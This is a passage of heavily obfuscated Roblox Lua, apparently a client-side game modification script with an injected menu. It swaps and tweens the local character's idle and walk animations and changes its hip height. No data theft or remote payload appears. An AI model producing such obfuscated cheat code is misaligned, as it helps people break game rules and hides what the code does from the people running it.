 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _IllIIIlllI = _IlIlllIIll("\049\056\050\053\051\053\055\048\052\051\052") if _IllIIIlllI then _IllIIIlllI.Priority = Enum.AnimationPriority.Idle _IllIIIlllI:Play(_lIIlIlllIl) _IllIIIlllI:AdjustSpeed(0x0) _IllIIIlllI.TimePosition = 0.3 end
 elseif _IIllllIlIl == "\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116" then _lllIIIIllI = _IlIlllIIll("\049\056\052\053\048\052\048\054\057\049\055") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _IllIIIIlII = TweenService:Create(_lllIIIIllI, TweenInfo.new(0x1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0.1}) _IllIIIIlII:Play() elseif _IIllllIlIl == "\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114" then _lllIIIIllI = _IlIlllIIll("\049\055\048\056\054\051\051\051\053\054\051") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI.TimePosition = 1.5 _IllIIIIlII = TweenService:Create(_lllIIIIllI, TweenInfo.new(0x3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0x2}) _IllIIIIlII:Play() elseif _IIllllIlIl == "\091\068\069\070\093\032\070\108\121\032\073\100\108\101" then _lllIIIIllI = _IlIlllIIll("\049\055\049\050\052\048\054\049\054\054\051") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) elseif _IIllllIlIl == "\091\083\071\093\032\077\097\121\104\101\109" then _lllIIIIllI = _IlIlllIIll("\049\055\048\057\055\055\049\050\051\056\055") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(.0x1) _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = .0x5+math.cos(_IIllIllIll/0x23)/0xF task.wait(.0x2) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\085\108\116\114\097\115\111\110\105\099" then _lllIIIIllI = _IlIlllIIll("\049\055\049\048\054\049\054\057\054\054\053") _lIIIIIIlIl = _IlIlllIIll("\051\049\051\055\054\050\054\051\048") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Action4 _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI:AdjustWeight(1e8) if _lIIIIIIlIl then _lIIIIIIlIl.Priority = Enum.AnimationPriority.Action4 _lIIIIIIlIl:Play(_lIIlIlllIl) _lIIIIIIlIl:AdjustWeight(1e8) end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = 1.2+math.sin(_IIllIllIll/0xF)/0x23 local _IllIllIIll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIllIIll then _IllIllIIll.HipHeight = 0x2+math.sin(_IIllIllIll/0xF)*0x2 end
 task.wait(.0x2) end
 local _IllIllIIll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIllIIll then _IllIllIIll.HipHeight = 0x0 end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\082\097\105\110\098\111\119" then _lllIIIIllI = _IlIlllIIll("\049\056\052\054\052\051\055\050\056\053\048") _llIIllIIII = _IlIlllIIll("\049\052\051\053\055\057\052\051\052\056\055") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) if _llIIllIIII then _llIIllIIII.Priority = Enum.AnimationPriority.Movement _llIIllIIII:Play(_lIIlIlllIl) _llIIllIIII:AdjustSpeed(0x0) end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then return end
 _lllIIIIllI.TimePosition = 2.75+math.cos(_IIllIllIll/0x23)/0x2D task.wait(.0x5) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\090\121\108\101\100\111\110" then _IllIIIlllI = _IlIlllIIll("\049\053\057\053\055\051\055\054\055\050\050") _lllIIIIllI = _IlIlllIIll("\055\050\048\052\050\048\050\052") if not _IllIIIlllI then _lIlIlIlIII = false return end
 _IllIIIlllI.Priority = Enum.AnimationPriority.Idle _IllIIIlllI:Play(_lIIlIlllIl) _IllIIIlllI:AdjustSpeed(0x0) _IllIIIlllI.Looped = true if _lllIIIIllI then _lllIIIIllI.Priority = Enum.AnimationPriority.Movement _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI.TimePosition = .0x1 _lllIIIIllI.Looped = true end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0x3B2E do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _IllIIIlllI.TimePosition = 3.2+math.cos(_IIllIllIll/0x19)/0xFF task.wait(.0x1) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101" then _lllIIIIllI = _IlIlllIIll("\049\050\057\050\057\053\049\053\054\051\051\054\054\055\053") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then return end
 _lllIIIIllI.TimePosition = .0x5+math.cos(_IIllIllIll/0xF)/0x23 task.wait(.0x5) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\080\117\114\105\116\121" then _lllIIIIllI = _IlIlllIIll("\049\055\049\050\049\054\057\053\051\050\057") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x1) elseif _IIllllIlIl == "\091\083\071\093\032\069\117\099\108\105\100\101\097\110" then _lllIIIIllI = _IlIlllIIll("\049\052\053\050\055\050\050\057\053\049\048") _IllIIIlllI = _IlIlllIIll("\057\057\050\055\055\056\056\053\051\050\053\051\055\052") _IlIIllllll = _IlIlllIIll("\049\053\049\052\054\051\052\056\055\051\056") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI.Looped = true if _IllIIIlllI then _IllIIIlllI.Priority = Enum.AnimationPriority.Idle _IllIIIlllI:Play(_lIIlIlllIl) _IllIIIlllI:AdjustSpeed(.0x8) _IllIIIlllI.Looped = true end
 if _IlIIllllll then _IlIIllllll.Priority = Enum.AnimationPriority.Movement _IlIIllllll:Play(_lIIlIlllIl) _IlIIllllll:AdjustSpeed(.0x1) _IlIIllllll.Looped = true end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0x3B2E do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = .0x9+math.cos(_IIllIllIll/0xF)/0x9B task.wait(.0x1) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\069\113\117\105\110\111\120" then _lllIIIIllI = _IlIlllIIll("\049\053\053\048\051\048\054\048\050\051\050") _llIIllIIII = _IlIlllIIll("\056\056\048\049\054\057\053\053") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) if _llIIllIIII then _llIIllIIII.Priority = Enum.AnimationPriority.Idle _llIIllIIII:Play(_lIIlIlllIl) _llIIllIIII:AdjustSpeed(0x0) end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = 4.8+math.cos(_IIllIllIll/0x5)/0xA task.wait(.0x1) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\067\114\097\122\101\100" then _lllIIIIllI = _IlIlllIIll("\055\053\051\049\056\050\050\056\052\048\055\052\050\050") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(.0x1) _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl local _llIlIIIllI = _lllIIIIllI task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 if not _llIlIIIllI or not _llIlIIIllI.IsPlaying then break end
 local _llIllIIIlI = math.random(0x1,0xF) if _llIllIIIlI == 0xF then for _lIIlIllIlI = 0x1,math.random(0x2,0x7) do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 if not _llIlIIIllI or not _llIlIIIllI.IsPlaying then break end
 _llIlIIIllI.TimePosition = .0x7 + math.random(-0xF,0xF)/0x37 task.wait(.0x1) end
 end
 if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _llIlIIIllI.TimePosition = .0x7 + math.cos(_IIllIllIll/0x23)/0x7 task.wait(.0x2) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107" then _lllIIIIllI = _IlIlllIIll("\049\053\048\049\056\050\049\057\054\057\050") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(.0x1) _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = .0x4+math.cos(_IIllIllIll/0x23)/0xF task.wait(.0x2) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116" then _lllIIIIllI = _IlIlllIIll("\049\054\055\049\057\049\048\055\048\053\048") _llIIllIIII = _IlIlllIIll("\049\053\049\052\054\051\052\056\055\051\056") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) if _llIIllIIII then _llIIllIIII.Priority = Enum.AnimationPriority.Idle _llIIllIIII:Play(_lIIlIlllIl) _llIIllIIII:AdjustSpeed(0x0) end
 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0xF423F do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = 2.5+math.cos(_IIllIllIll/0xF)/0xF task.wait(.0x2) end
 end
 ) elseif _IIllllIlIl == "\091\083\071\093\032\068\105\118\105\110\105\116\121" then _lllIIIIllI = _IlIlllIIll("\049\055\052\054\052\054\052\052\049\056\050") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Action4 _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI:AdjustWeight(1e8) _lllIIIIllI.Looped = true _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () for _IIllIllIll = 0x1,0x3B2E do if not _IIIlllIIlI or _IlIllIIlIl ~= _IIllIllIII then break end
 _lllIIIIllI.TimePosition = .0x3+math.cos(_IIllIllIll/0x5)/0x2D task.wait(.0x1) end
 end
 ) elseif _IIllllIlIl == "\091\068\069\070\093\032\065\117\114\097" then _lllIIIIllI = _IlIlllIIll("\049\048\052\056\054\050\055\053\048\050\054\055\057\054\055") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI.Looped = true _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0.6) elseif _IIllllIlIl == "\091\068\069\070\093\032\083\101\114\105\111\117\115" then _lllIIIIllI = _IlIlllIIll("\049\052\048\049\054\052\054\052\050\048\052\055\049\056\056") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI.Looped = true _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI.TimePosition = 0x1 _lllIIIIllI:AdjustSpeed(0x0) _IllIIIIlII = TweenService:Create(_lllIIIIllI, TweenInfo.new(0x4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 1.1}) _IllIIIIlII:Play() elseif _IIllllIlIl == "\091\068\069\070\093\032\082\101\119\111\114\107" then _lllIIIIllI = _IlIlllIIll("\049\053\057\054\051\054\048\050\051\054\055") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI.TimePosition = 0x0 _IllIIIIlII = TweenService:Create(_lllIIIIllI, TweenInfo.new(1.7 / 0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 1.7}) _IllIIIIlII:Play() elseif _IIllllIlIl == "\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103" then _lllIIIIllI = _IlIlllIIll("\056\055\048\054\048\050\057\056\050\048\056\050\056\052") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI.Looped = true _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x1) elseif _IIllllIlIl == "\091\068\069\070\093\032\068\105\118\105\110\101" then _lllIIIIllI = _IlIlllIIll("\049\049\054\049\056\055\053\048\051\052\053\049\057\057\057") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI.Looped = false _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x0) _lllIIIIllI.TimePosition = 10.10 _IllIIIIlII = TweenService:Create(_lllIIIIllI, TweenInfo.new((13.67 - 10.10) / 0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -0x1, true, 0x0), {TimePosition = 13.67}) _IllIIIIlII:Play() elseif _IIllllIlIl == "\091\068\069\070\093\032\071\111\100" then _lllIIIIllI = _IlIlllIIll("\055\050\052\054\048\054\054\048\048\049\053\048\057\053") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI.Looped = false _lllIIIIllI:Play(_lIIlIlllIl) _lllIIIIllI:AdjustSpeed(0x1) _lllIIIIllI.TimePosition = 3.35 _IIIlllIIlI = true local _IIllIllIII = _IlIllIIlIl task.spawn( function () while _IIIlllIIlI and _IlIllIIlIl == _IIllIllIII do if _lllIIIIllI.TimePosition >= 4.6 then _lllIIIIllI:AdjustSpeed(0.2) local _lIlIlIIlll = true while _IIIlllIIlI and _IlIllIIlIl == _IIllIllIII do local _lllIlIllll = _lllIIIIllI.TimePosition if _lIlIlIIlll then if _lllIlIllll >= 4.9 then _lIlIlIIlll = false _lllIIIIllI:AdjustSpeed(-0.2) end
 else if _lllIlIllll <= 4.6 then _lIlIlIIlll = true _lllIIIIllI:AdjustSpeed(0.2) end
 end
 task.wait() end
 break end
 task.wait() end
 end
 ) end
 _lIlIlIlIII = false task.defer(_IIllllllll) end
 _lIllllllIl = RunService.Heartbeat:Connect( function () if _lIlIlIlIII then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then if _lIlIIIllII ~= "" then _lIlIIlIllI(false) _lIlIIIllII = "" _llIlIllIIl = "" end
 return end
 local _IlIIIllIIl = _lIIlIllIlI.IdleAnimation and _lIIlIllIlI.IdleAnimation.Value or "\078\111\114\109\097\108" local _IllIIlIlIl = _lIIlIllIlI.WalkAnimation and _lIIlIllIlI.WalkAnimation.Value or "\078\111\114\109\097\108" if _IlIIIllIIl == "\078\111\114\109\097\108" or _lIlIIllIII.MoveDirection ~= Vector3.new() then if _IlIIIllIIl == "\078\111\114\109\097\108" and _lIlIIllIII.MoveDirection ~= Vector3.new() then return end
 if _lIlIIIllII ~= "" then _lIlIIlIllI(false) _lIlIIIllII = "" _llIlIllIIl = "" _IIllllllll() end
 return end
 local _IlIIlIIIIl = (_IlIIIllIIl ~= _lIlIIIllII) if not _IlIIlIIIIl then if _lllIIIIllI and _lllIIIIllI.IsPlaying then return end
 if _IllIIIlllI and _IllIIIlllI.IsPlaying then return end
 end
 local _IllIIlIlll = (_lIlIIIllII ~= "") _lIlIIIllII = _IlIIIllIIl task.spawn(_IlIIIlIIlI, _IlIIIllIIl, _IllIIlIlll) end
 ) table.insert(_IllIllIIll, function () if _lIllllllIl then _lIllllllIl:Disconnect() _lIllllllIl = nil end
 _lIlIlIlIII = false _lIlIIIllII = "" _llIlIllIIl = "" _lIlIIlIllI(true) _lIllIIllIl() pcall( function () _llIIllIlll.SGVFXToggle:SetValue(false) end
 ) pcall( function () _lIIlIllIlI.IdleAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) _lllIIlIllI:AddDivider() local _IlIllIlIIl = { ["\071\111\106\111\032\082\117\110"] = "\049\056\056\057\055\049\049\053\055\056\053", ["\071\105\114\108\121\032\087\097\108\107"] = "\049\055\056\054\049\056\054\050\055\056\055", ["\083\116\101\118\101\032\087\097\108\107"] = "\049\055\056\054\049\056\055\050\053\049\057", ["\083\097\115\115\121\032\087\097\108\107"] = "\049\055\056\054\049\056\057\051\048\057\052", ["\089\097\110\100\101\114\101\032\087\097\108\107"] = "\049\055\048\056\054\048\053\052\057\057\052", ["\083\119\111\114\100\032\087\097\108\107"] = "\049\055\049\050\048\054\051\053\057\050\054", ["\077\097\114\099\104"] = "\049\053\057\054\050\052\052\051\054\053\050", ["\072\117\110\116\101\114"] = "\049\053\057\054\050\051\050\054\053\057\051", ["\071\111\111\102\121"] = "\049\056\056\057\055\054\054\052\050\057\057", ["\079\102\102\105\099\101\114\032\069\097\114\108"] = "\049\056\056\057\055\055\048\048\050\051\054", ["\075\097\122\111\116\115\107\121\032\075\105\099\107"] = "\049\055\056\054\049\056\055\048\057\057\054", ["\073\110\032\067\104\097\114\103\101"] = "\049\051\050\049\051\050\056\052\056\048\057\057\049\048\051", } _lllIIlIllI:AddDropdown("\087\097\108\107\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\114\109\097\108","\071\111\106\111\032\082\117\110","\071\105\114\108\121\032\087\097\108\107","\083\116\101\118\101\032\087\097\108\107","\083\097\115\115\121\032\087\097\108\107","\089\097\110\100\101\114\101\032\087\097\108\107","\083\119\111\114\100\032\087\097\108\107","\077\097\114\099\104","\072\117\110\116\101\114","\071\111\111\102\121","\079\102\102\105\099\101\114\032\069\097\114\108","\075\097\122\111\116\115\107\121\032\075\105\099\107","\073\110\032\067\104\097\114\103\101","\070\108\121\105\110\103" }, Default = 0x1, Multi = false, Text = "\087\097\108\107\032\065\110\105\109\097\116\105\111\110", Searchable = true, }) _lllIIlIllI:AddSlider("\087\097\108\107\065\110\105\109\083\112\101\101\100", { Text = "\087\097\108\107\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.25, Max = 0x3, Rounding = 0x1, }) _lllIIlIllI:AddDropdown("\076\111\111\112\101\100\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\110\101", "\083\112\105\110", "\067\114\097\122\121" }, Default = 0x1, Multi = false, Text = "\076\111\111\112\101\100\032\065\110\105\109\097\116\105\111\110", }) _lllIIlIllI:AddSlider("\076\111\111\112\101\100\065\110\105\109\097\116\105\111\110\083\112\101\101\100", { Text = "\076\111\111\112\101\100\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.1, Max = 0xA, Rounding = 0x1, }) local _IlIllIlIlI = nil local _IIIIlIlIII = nil local _lIIIlIllIl = "" local _IIIlllIlIl = { Forward = "\049\055\049\050\052\048\054\051\056\050\054", Back = "\049\055\049\050\052\048\054\055\054\051\053", Left = "\049\055\049\050\052\049\048\053\050\057\052", Right = "\049\055\049\050\052\049\049\050\053\052\055", } local _llIlIlIIII = {} _lIIlIllIlI.WalkAnimSpeed:OnChanged( function (V) if _IIIIlIlIII then pcall( function () _IIIIlIlIII:AdjustSpeed(V) end
 ) end
 for _lIIlIllIlI, _IlIlIlIlIl in pairs(_llIlIlIIII) do if _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:AdjustSpeed(V) end
 ) end
 end
 end
 ) local function _llIlIIIllI() for _lIIlIllIlI, _lIIIllllII in pairs(_llIlIlIIII) do pcall( function () if _lIIIllllII.IsPlaying then _lIIIllllII:Stop(0x0) end
 end
 ) pcall( function () _lIIIllllII:Destroy() end
 ) end
 _llIlIlIIII = {} end
 local function _lIIIIlIlll(_lIlIlllIIl) for _lIIIIllIIl, _IlIlIlIlIl in pairs(_llIlIlIIII) do local _lIlIlIlIIl = false if _lIlIlllIIl then for _lIIlIllIlI, _IllIIlllIl in ipairs(_lIlIlllIIl) do if _IllIIlllIl == _lIIIIllIIl then _lIlIlIlIIl = true break end
 end
 end
 if _lIlIlIlIIl then if not _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:Play(0.1) end
 ) end
 else if _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:Stop(0.1) end
 ) end
 end
 end
 end
 local function _IllIIlIIIl() _llIlIIIllI() local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lllllIIlII = _IllIllIIll and _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _lllllIIlII then return end
 for _lIIIIllIIl, _IlIIIllllI in pairs(_IIIlllIlIl) do local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIIIllllI local _lIIIllllII = _lllllIIlII:LoadAnimation(_IlIllllIlI) _lIIIllllII.Priority = Enum.AnimationPriority.Movement _lIIIllllII.Looped = true _llIlIlIIII[_lIIIIllIIl] = _lIIIllllII end
 end
 local _llIlIIIIII = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _llllIlIlII = nil local function _lIIlIIIlII() if _llllIlIlII then _llllIlIlII:Cancel() _llllIlIlII = nil end
 if _IIIIlIlIII then pcall( function () _IIIIlIlIII:Stop(0.1) end
 ) _IIIIlIlIII = nil _lIIIlIllIl = "" end
 _llIlIIIllI() end
 local function _llIlIllIIl(_IlIIIllllI) _lIIlIIIlII() local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lllllIIlII = _IllIllIIll and _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _lllllIIlII then return end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIIIllllI local _lIIIllllII = _lllllIIlII:LoadAnimation(_IlIllllIlI) if _llIlIIlIll.Character ~= _IlIlIllIll then pcall( function () _lIIIllllII:Destroy() end
 ) return end
 _lIIIllllII.Priority = Enum.AnimationPriority.Movement _lIIIllllII.Looped = true _IIIIlIlIII = _lIIIllllII _lIIIlIllIl = _IlIIIllllI end
 local _IlIIllllII = nil local function _IIIIIlIlII(_IIIlllIIlI) if _IlIIllllII then _IlIIllllII:Disconnect() _IlIIllllII = nil end
 if not _IIIlllIIlI then return end
 _IlIIllllII = _IIIlllIIlI.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IlIIIllIIl = _lIIlIllIlI.WalkAnimation and _lIIlIllIlI.WalkAnimation.Value or "\078\111\114\109\097\108" local _IlIlIlIlIl = _lIIIllIlIl and _lIIIllIlIl.Flying local _IllIIIIllI = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId:match("\037\100\043") or "" if _IlIIIllIIl == "\078\111\114\109\097\108" and not _IlIlIlIlIl then return end
 if _IllIIIIllI == "\055\056\049\053\054\049\056\049\055\053" then local _llllIllIll = _llIlIIlIll.Character local _IIIIllIllI = _llllIllIll and _llllIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIIllIllI and _IIIIllIllI.MoveDirection ~= Vector3.new() then _IlIlIlIlIl:Stop() end
 end
 end
 ) end
 do local _IllIllIIll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _IIIIIlIlII(_IllIllIIll) end
 local _IIIIlIlIlI = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) if _IIIIlIlIII then pcall( function () _IIIIlIlIII:Stop(0x0) end
 ) end
 _IIIIlIlIII = nil _lIIIlIllIl = "" task.spawn( function () local _IllIllIIll = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if not _IllIllIIll then return end
 local _lllllIIlII = _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _IllIllIIll:WaitForChild("\065\110\105\109\097\116\111\114", 0x5) if not _lllllIIlII then return end
 if not _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") then _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x5) end
 _IIIIIlIlII(_IllIllIIll) local _IlIIIllIIl = _lIIlIllIlI.WalkAnimation and _lIIlIllIlI.WalkAnimation.Value or "\078\111\114\109\097\108" if _IlIIIllIIl ~= "\078\111\114\109\097\108" and _IlIIIllIIl ~= "\070\108\121\105\110\103" then local _IlIIIllllI = _IlIllIlIIl[_IlIIIllIIl] or "" if _IlIIIllllI ~= "" then _llIlIllIIl(_IlIIIllllI) end
 end
 end
 ) end
 ) _lIIlIllIlI.WalkAnimation:OnChanged( function (_IlIIIllIIl) _lIIlIIIlII() if _IlIIIllIIl ~= "\078\111\114\109\097\108" and _IlIIIllIIl ~= "\070\108\121\105\110\103" then local _IlIIIllllI = _IlIllIlIIl[_IlIIIllIIl] or "" if _IlIIIllllI ~= "" then task.spawn( function () _llIlIllIIl(_IlIIIllllI) local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IIIIlIlIII and _IllIllIIll and _IllIllIIll.MoveDirection ~= Vector3.new()) then return end
 pcall( function () _IIIIlIlIII:Play(0.1) end
 ) pcall( function () _IIIIlIlIII:AdjustSpeed(_lIIlIllIlI.WalkAnimSpeed and _lIIlIllIlI.WalkAnimSpeed.Value or 0x1) end
 ) end
 ) end
 end
 end
